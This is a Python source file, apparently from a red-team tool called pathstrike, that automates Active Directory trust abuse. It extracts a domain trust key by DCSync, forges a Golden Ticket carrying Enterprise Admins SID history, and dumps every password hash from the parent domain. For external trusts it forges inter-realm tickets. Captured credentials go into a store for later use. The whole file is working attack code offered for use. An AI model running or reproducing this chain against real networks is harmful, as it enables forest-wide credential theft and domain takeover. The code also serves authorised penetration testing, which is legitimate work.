"""Domain trust exploitation handler with child→parent escalation.

Exploits the ``TrustedBy`` BloodHound edge.  Supports two attack modes:

**Child→Parent (intra-forest):**
    1. DCSync the child domain to extract the trust key (``PARENT_DOMAIN$``).
    2. Forge a Golden Ticket with ``-extra-sid <parent_sid>-519`` to inject
       Enterprise Admins into the PAC via SID History.
    3. Use the forged ticket to DCSync the parent domain → full forest
       compromise.

**External/Generic trust:**
    1. DCSync to extract the trust account hash.
    2. Forge an inter-realm TGT via ``getST.py`` to access the trusted domain.

Rollback:
    None — authentication-based attack with no AD modifications.
"""

from __future__ import annotations

import re
import shutil

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import impacket_wrapper as impacket


@register_handler(
    "TrustedBy", "SameForestTrust", "ExternalTrust", "TrustedForestTrust",
    "CrossForestTrust", "AbuseTGTDelegation", "HasTrustKeys",
)
class TrustedByHandler(BaseEdgeHandler):
    """Exploit ``TrustedBy`` edges via trust key abuse.

    Automatically detects child→parent relationships and escalates
    to Enterprise Admin via Golden Ticket with SID History injection.
    """

    def __init__(self, config, credential_store):
        super().__init__(config, credential_store)
        self._current_edge_child_sid: str | None = None
        self._current_edge_parent_sid: str | None = None

    # ------------------------------------------------------------------
    # Prerequisites
    # ------------------------------------------------------------------

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if not shutil.which("secretsdump.py"):
            return False, "secretsdump.py not found. Install impacket."
        if not shutil.which("ticketer.py"):
            return False, "ticketer.py not found. Install impacket."

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return False, f"No credentials for '{source_user}'."

        is_child = self._is_child_parent_trust(edge)
        if is_child:
            parent = self._get_target_domain(edge)
            return True, (
                f"Child→Parent trust detected: {domain} → {parent}. "
                "Will forge Golden Ticket with Enterprise Admin SID History."
            )

        return True, "Ready for inter-realm TGT forging via trust key."

    # ------------------------------------------------------------------
    # Exploitation
    # ------------------------------------------------------------------

    async def exploit(
        self,
        edge: EdgeInfo,
        dry_run: bool = False,
    ) -> tuple[bool, str, list[Credential]]:
        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        dc_host = self._get_dc_host()
        target_domain = self._get_target_domain(edge)

        is_child = self._is_child_parent_trust(edge)

        if dry_run:
            if is_child:
                return (
                    True,
                    f"[DRY RUN] Child→Parent escalation: {domain} → {target_domain}. "
                    f"Would extract trust key, forge Golden Ticket with "
                    f"Enterprise Admin SID History, then DCSync parent domain.",
                    [],
                )
            return (
                True,
                f"[DRY RUN] Would extract trust key and forge inter-realm TGT "
                f"from '{domain}' to '{target_domain}'.",
                [],
            )

        new_creds: list[Credential] = []

        # ---- Step 1: Try raiseChild.py first (automated one-shot) ------
        if is_child and shutil.which("raiseChild.py"):
            self.logger.info(
                "Attempting raiseChild.py: %s → %s", domain, target_domain,
            )
            result = await self._try_raise_child(source_user, domain, dc_host)
            if result["success"]:
                hashes = (result.get("parsed") or {}).get("hashes", {})
                for user, nt in hashes.items():
                    cred = Credential(
                        cred_type=CredentialType.nt_hash,
                        value=nt,
                        username=user,
                        domain=target_domain,
                        obtained_from=f"raiseChild.py ({domain} → {target_domain})",
                    )
                    new_creds.append(cred)
                    self.cred_store.add_credential(cred)

                return (
                    True,
                    f"raiseChild.py succeeded: escalated from {domain} to "
                    f"{target_domain}. Captured {len(hashes)} hash(es).",
                    new_creds,
                )
            self.logger.warning(
                "raiseChild.py failed, falling back to manual approach: %s",
                result.get("error", "unknown"),
            )

        # ---- Step 2: Extract trust key via DCSync ----------------------
        trust_account = f"{target_domain.split('.')[0].upper()}$"
        trust_hash = await self._get_or_extract_trust_key(
            source_user, domain, dc_host, trust_account, new_creds,
        )
        if trust_hash is None:
            return (
                False,
                f"Failed to extract trust key for '{trust_account}'.",
                new_creds,
            )

        # ---- Step 3: Fork based on trust type --------------------------
        if is_child:
            # Cache SIDs from BH CE node properties for the escalation method
            self._current_edge_child_sid = self._get_domain_sid_from_edge(edge, domain)
            self._current_edge_parent_sid = self._get_domain_sid_from_edge(edge, target_domain)
            return await self._child_to_parent_escalation(
                domain, target_domain, dc_host, trust_hash,
                trust_account, new_creds,
            )
        else:
            return await self._external_trust_exploit(
                source_user, domain, target_domain, dc_host,
                trust_hash, trust_account, new_creds,
            )

    # ------------------------------------------------------------------
    # Child→Parent: Golden Ticket + SID History
    # ------------------------------------------------------------------

    async def _child_to_parent_escalation(
        self,
        child_domain: str,
        parent_domain: str,
        dc_host: str,
        trust_hash: str,
        trust_account: str,
        new_creds: list[Credential],
    ) -> tuple[bool, str, list[Credential]]:
        """Escalate from child domain to parent via Golden Ticket with -extra-sid."""

        # Get domain SIDs from BH CE node objectId properties
        # We need the edge to look up SIDs — pass it through from exploit()
        child_sid = self._current_edge_child_sid
        parent_sid = self._current_edge_parent_sid

        if not child_sid:
            return (
                False,
                f"Cannot determine SID for child domain '{child_domain}'. "
                "Check BH CE data.",
                new_creds,
            )

        if not parent_sid:
            # Try to derive parent SID from child SID (common pattern)
            # Or just use the Enterprise Admins RID
            self.logger.warning(
                "Parent domain SID unknown — will attempt without "
                "explicit SID. May fail."
            )

        # Build the Enterprise Admins extra-sid
        # Format: <parent_domain_sid>-519
        if parent_sid:
            ea_sid = f"{parent_sid}-519"
        else:
            ea_sid = None

        # Step 3a: Forge Golden Ticket with SID History injection
        self.logger.info(
            "Forging Golden Ticket: domain=%s, extra-sid=%s (Enterprise Admins)",
            child_domain, ea_sid or "unknown",
        )

        ticketer_result = await impacket.ticketer(
            domain=child_domain,
            domain_sid=child_sid,
            nthash=trust_hash,
            user="Administrator",
            groups="512,513,518,519,520",
            extra_sid=ea_sid,
            dc_ip=dc_host,
        )

        if not ticketer_result["success"]:
            return (
                False,
                f"Golden Ticket forging failed: "
                f"{ticketer_result.get('error', 'unknown')}",
                new_creds,
            )

        # Store the forged ticket
        ccache_file = "Administrator.ccache"
        ccache_cred = Credential(
            cred_type=CredentialType.ccache,
            value=ccache_file,
            username="Administrator",
            domain=parent_domain,
            obtained_from=(
                f"Golden Ticket with EA SID History "
                f"({child_domain} → {parent_domain})"
            ),
        )
        new_creds.append(ccache_cred)
        self.cred_store.add_credential(ccache_cred)

        # Step 3b: DCSync parent domain using the forged ticket
        self.logger.info(
            "DCSync parent domain %s with forged Enterprise Admin ticket",
            parent_domain,
        )

        # Set KRB5CCNAME for Kerberos auth
        import os
        os.environ["KRB5CCNAME"] = ccache_file

        parent_dc = self.config.domain.dc_host  # TODO: resolve parent DC
        dcsync_result = await impacket.secretsdump(
            target=parent_dc,
            auth_args=["-k", "-no-pass", "-dc-ip", parent_dc],
            domain=parent_domain,
            username="Administrator",
            just_dc=True,
            timeout=120,
        )

        if dcsync_result["success"]:
            hashes = dcsync_result.get("hashes", {})
            for user, nt in hashes.items():
                cred = Credential(
                    cred_type=CredentialType.nt_hash,
                    value=nt,
                    username=user,
                    domain=parent_domain,
                    obtained_from=f"DCSync parent domain ({parent_domain})",
                )
                new_creds.append(cred)
                self.cred_store.add_credential(cred)

            return (
                True,
                f"Child→Parent escalation complete: {child_domain} → "
                f"{parent_domain}. Forged EA Golden Ticket and captured "
                f"{len(hashes)} hash(es) from parent domain.",
                new_creds,
            )

        # Ticket forged but DCSync failed — still partial success
        return (
            True,
            f"Golden Ticket with EA SID History forged for {parent_domain}. "
            f"DCSync failed ({dcsync_result.get('error', 'unknown')}), "
            f"but ticket is available at {ccache_file}.",
            new_creds,
        )

    # ------------------------------------------------------------------
    # External/generic trust: inter-realm TGT
    # ------------------------------------------------------------------

    async def _external_trust_exploit(
        self,
        source_user: str,
        domain: str,
        target_domain: str,
        dc_host: str,
        trust_hash: str,
        trust_account: str,
        new_creds: list[Credential],
    ) -> tuple[bool, str, list[Credential]]:
        """Forge inter-realm TGT for external trust access."""

        self.logger.info(
            "Forging inter-realm TGT: %s → %s", domain, target_domain,
        )

        spn = f"krbtgt/{target_domain}"
        trust_auth = impacket.build_impacket_auth(
            domain=domain,
            username=trust_account,
            nt_hash=trust_hash,
            dc_ip=dc_host,
        )

        st_result = await impacket.get_st(
            spn=spn,
            impersonate="Administrator",
            auth_args=trust_auth,
            domain=domain,
            username=trust_account,
            nt_hash=trust_hash,
            dc_ip=dc_host,
        )

        if not st_result["success"]:
            return (
                False,
                f"Inter-realm TGT forging failed: "
                f"{st_result.get('error', 'unknown')}",
                new_creds,
            )

        ccache_cred = Credential(
            cred_type=CredentialType.ccache,
            value=f"Administrator@krbtgt_{target_domain}.ccache",
            username="Administrator",
            domain=target_domain,
            obtained_from=f"Inter-realm TGT ({domain} → {target_domain})",
        )
        new_creds.append(ccache_cred)
        self.cred_store.add_credential(ccache_cred)

        return (
            True,
            f"Inter-realm TGT forged for Administrator in '{target_domain}'.",
            new_creds,
        )

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    async def _try_raise_child(
        self, source_user: str, domain: str, dc_ip: str,
    ) -> dict:
        """Try raiseChild.py as a one-shot escalation."""
        cred = self.cred_store.get_best_credential(source_user, domain)
        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = self.config.credentials.password
            nt_hash = self.config.credentials.nt_hash

        return await impacket.raise_child(
            domain=domain,
            username=source_user,
            password=password,
            nt_hash=nt_hash,
            dc_ip=dc_ip,
            timeout=120,
        )

    async def _get_or_extract_trust_key(
        self,
        source_user: str,
        domain: str,
        dc_host: str,
        trust_account: str,
        new_creds: list[Credential],
    ) -> str | None:
        """Return the trust key, extracting via DCSync if not cached."""

        # Check cache first
        trust_cred = self.cred_store.get_best_credential(trust_account, domain)
        if trust_cred and trust_cred.cred_type == CredentialType.nt_hash:
            self.logger.info("Using cached trust key for '%s'", trust_account)
            return trust_cred.value

        # DCSync to extract
        self.logger.info("DCSync to extract trust key for '%s'", trust_account)
        _target_str, auth_flags = self._get_impacket_auth(source_user)

        cred = self.cred_store.get_best_credential(source_user, domain)
        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = self.config.credentials.password
            nt_hash = self.config.credentials.nt_hash

        result = await impacket.secretsdump(
            target=dc_host,
            auth_args=auth_flags,
            domain=domain,
            username=source_user,
            password=password,
            nt_hash=nt_hash,
            dc_ip=dc_host,
            just_dc=True,
            just_dc_user=trust_account,
            timeout=120,
        )

        if not result["success"]:
            self.logger.error(
                "DCSync failed for '%s': %s",
                trust_account, result.get("error"),
            )
            return None

        hashes = result.get("hashes", {})
        for key, val in hashes.items():
            if key.lower().rstrip("$") == trust_account.lower().rstrip("$"):
                # Store it
                cred_obj = Credential(
                    cred_type=CredentialType.nt_hash,
                    value=val,
                    username=trust_account,
                    domain=domain,
                    obtained_from=f"DCSync trust key extraction ({domain})",
                )
                new_creds.append(cred_obj)
                self.cred_store.add_credential(cred_obj)
                self.logger.info(
                    "Captured trust key for '%s': %s...%s",
                    trust_account, val[:4], val[-4:],
                )
                return val

        # Try parsing raw output as fallback
        output = result.get("output", "")
        match = re.search(
            rf"{re.escape(trust_account)}.*?:.*?:.*?:([a-fA-F0-9]{{32}})",
            output, re.IGNORECASE,
        )
        if match:
            val = match.group(1).lower()
            cred_obj = Credential(
                cred_type=CredentialType.nt_hash,
                value=val,
                username=trust_account,
                domain=domain,
                obtained_from=f"DCSync trust key extraction ({domain})",
            )
            new_creds.append(cred_obj)
            self.cred_store.add_credential(cred_obj)
            return val

        self.logger.error("Trust key hash not found in DCSync output")
        return None

    def _is_child_parent_trust(self, edge: EdgeInfo) -> bool:
        """Detect if this is a child→parent domain trust.

        Child domains are subdomains of the parent (e.g.
        ``north.sevenkingdoms.local`` is a child of ``sevenkingdoms.local``).
        """
        source_domain = (edge.source.domain or edge.source.name).upper()
        target_domain = self._get_target_domain(edge).upper()

        # Child→Parent: source domain ends with .target_domain
        # e.g. NORTH.SEVENKINGDOMS.LOCAL ends with .SEVENKINGDOMS.LOCAL
        if source_domain.endswith(f".{target_domain}"):
            return True

        # Or check the reverse: target is parent
        if target_domain.endswith(f".{source_domain}"):
            return False  # This is parent→child, not child→parent

        return False

    def _get_target_domain(self, edge: EdgeInfo) -> str:
        """Get the target domain name from the edge."""
        return (
            edge.target.properties.get("domain")
            or edge.target.domain
            or edge.target.name.split("@")[-1]
            if "@" in edge.target.name
            else edge.target.name
        )

    def _get_domain_sid_from_edge(self, edge: EdgeInfo, domain_name: str) -> str | None:
        """Extract the domain SID from BH CE node objectId.

        BH CE stores domain SIDs as the ``objectId`` of Domain nodes
        (e.g. ``S-1-5-21-83997547-684772538-2971313386``).
        """
        # Check source node
        src_domain = (edge.source.domain or edge.source.name).upper()
        if src_domain == domain_name.upper() or edge.source.name.upper() == domain_name.upper():
            oid = edge.source.object_id
            if oid and oid.startswith("S-1-5-21-"):
                return oid

        # Check target node
        tgt_domain = self._get_target_domain(edge).upper()
        if tgt_domain == domain_name.upper() or edge.target.name.upper() == domain_name.upper():
            oid = edge.target.object_id
            if oid and oid.startswith("S-1-5-21-"):
                return oid

        return None

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        return None
